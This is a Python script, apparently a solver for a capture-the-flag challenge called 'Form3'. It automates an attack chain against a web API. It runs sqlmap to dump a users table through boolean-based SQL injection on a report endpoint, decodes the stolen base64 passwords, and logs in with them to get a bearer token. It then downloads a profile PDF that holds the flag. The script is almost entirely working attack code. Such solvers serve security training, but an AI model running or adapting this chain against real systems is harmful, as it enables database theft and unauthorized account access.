import base64
import os.path
import re

import requests
import subprocess
import argparse
import csv


def sqlmap_run():
    global target
    users = []
    output = None
    try:
        output = subprocess.check_output(
            f"sqlmap -u '{target}/v1/report?customer=1' --technique=B --dump -T users --dbms=SQLite --risk=3 --level=5 -p customer --batch",
            shell=True
        )
    except subprocess.CalledProcessError:
        print("[-] Error calling SQLMAP")
        exit(1)
    for line in output.decode().split("\n"):
        if not line.find("CSV file") > -1:
            continue
        if not line.find("users.csv") > -1:
            continue
        matches = re.findall(r"'([^']*)'", line)
        if len(matches) < 2:
            continue
        file = matches[1].replace("'", "")
        if file == "" or not os.path.isfile(file):
            continue
        with open(file, "r") as csv_file:
            csv_reader = csv.DictReader(csv_file)
            for row in csv_reader:
                users.append(row)
        return users
    return None


def authenticate(user, password):
    global target
    data = {
        "username": user,
        "password": password
    }
    res = requests.post(target + "/v1/token", json=data, verify=False)
    if res.status_code == 200:
        return res.text.strip()


def download(token, file):
    res = requests.get(target + "/v1/profile?format=pdf", verify=False, headers={"Authorization": f"Bearer {token}"})
    if res.status_code == 200:
        data = res.content
        with open(file, "wb") as pdf:
            pdf.write(data)
            return True
    return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Form3 Challenge Solver")
    parser.add_argument("target", help="Target IP:PORT")
    args = parser.parse_args()
    target = f"http://{args.target}"

    print("[*] Launching SQLmap")
    users = sqlmap_run()
    print("[*] Auth attack on /v1/token")
    token = None
    for user in users:
        cleart_text_password = base64.b64decode(user["password"]).decode()
        token = authenticate(user["username"], cleart_text_password)
        if token:
            break
    print(f"[+] Retrieved token: {token}")
    print("[*] Getting flag on /v1/profile?format=pdf")
    pdf = "profile.pdf"
    success = download(token, pdf)
    if success:
        print(f"[+] Flag dumped in {pdf}")

